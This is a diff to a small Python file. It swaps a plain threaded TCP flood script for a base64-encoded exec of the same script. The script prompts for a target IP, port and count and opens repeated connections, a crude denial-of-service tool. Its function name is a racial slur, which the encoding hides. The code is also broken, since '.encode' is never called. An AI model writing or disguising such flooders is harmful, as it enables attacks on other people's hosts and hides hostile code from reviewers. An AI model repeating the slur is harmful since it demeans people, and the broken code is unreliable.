@@ -1,15 +1,2 @@
-import socket, threading
-
-ip = str(input("ip: "))
-port = int(input("port: "))
-time = int(input("time: "))
-
-def nigger():
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  s.connect((ip, port))
-  s.send("GET UR MOM".encode)
-  s.close()
-	
-for _ in range(time):
-  threading.Thread(target = nigger).start() 
-
+import base64
+exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgdGhyZWFkaW5nCgppcCA9IHN0cihpbnB1dCgiaXA6ICIpKQpwb3J0ID0gaW50KGlucHV0KCJwb3J0OiAiKSkKdGltZSA9IGludChpbnB1dCgidGltZTogIikpCgpkZWYgbmlnZ2VyKCk6CglzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQoJcy5jb25uZWN0KChpcCwgcG9ydCkpCglzLnNlbmQoIkdFVCBVUiBNT00iLmVuY29kZSkKCXMuY2xvc2UoKQoKZm9yIF8gaW4gcmFuZ2UodGltZSk6Cgl0aHJlYWRpbmcuVGhyZWFkKHRhcmdldCA9IG5pZ2dlcikuc3RhcnQoKQo='))
